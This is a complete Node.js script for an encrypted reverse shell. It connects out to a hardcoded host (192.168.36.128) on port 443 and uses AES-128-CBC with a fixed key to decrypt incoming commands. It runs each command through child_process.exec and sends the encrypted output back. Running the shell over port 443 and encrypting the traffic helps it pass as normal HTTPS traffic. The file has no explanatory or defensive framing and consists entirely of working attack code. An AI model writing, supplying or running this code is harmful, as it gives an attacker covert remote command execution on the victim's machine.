const net = require('net');
const crypto = require('crypto');
const { exec } = require('child_process');

const HOST = '192.168.36.128';
const PORT = 443;
const KEY = Buffer.from('AE50o00ooo00K3Y!');
let IV = crypto.randomBytes(16);

function encrypt(text) {
  const cipher = crypto.createCipheriv('aes-128-cbc', KEY, IV);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

function decrypt(enc) {
  const decipher = crypto.createDecipheriv('aes-128-cbc', KEY, IV);
  let decrypted = decipher.update(enc, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

const client = new net.Socket();

client.connect(PORT, HOST, () => {
  console.log('Connected to server');

  client.write(IV.toString('hex'));
});

client.on('data', data => {
  try {
    const cmd = decrypt(data.toString());
    exec(cmd, (error, stdout, stderr) => {
      let output = '';
      if (error) output += error.message + '\n';
      if (stdout) output += stdout;
      if (stderr) output += stderr;

      const encryptedOutput = encrypt(output);
      client.write(encryptedOutput);
    });
  } catch (e) {
    console.error('Decrypt error:', e.message);
  }
});

client.on('close', () => {
  console.log('Connection closed');
});

client.on('error', err => {
  console.error('Client error:', err.message);
});
